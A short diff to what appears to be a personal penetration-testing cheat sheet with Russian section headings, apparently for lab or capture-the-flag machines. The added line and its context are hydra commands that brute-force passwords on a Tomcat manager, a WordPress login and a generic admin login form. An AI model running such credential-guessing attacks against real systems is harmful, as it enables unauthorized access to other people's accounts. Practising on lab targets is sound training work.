@@ -30,6 +30,8 @@ hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/ht
 
 hydra -vV -l elliot -P pass.txt 192.168.50.123 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'    ---(Последнее из BURPA)
 
+hydra -vV -f -l admin -P pass.txt 10.10.11.114 http-post-form -m '/login:username=^USER^&password=^PASS^:Invalid password.'
+
 # Перебор хешей по словарю и брут
 
 ***Взлом приватного ключа ssh
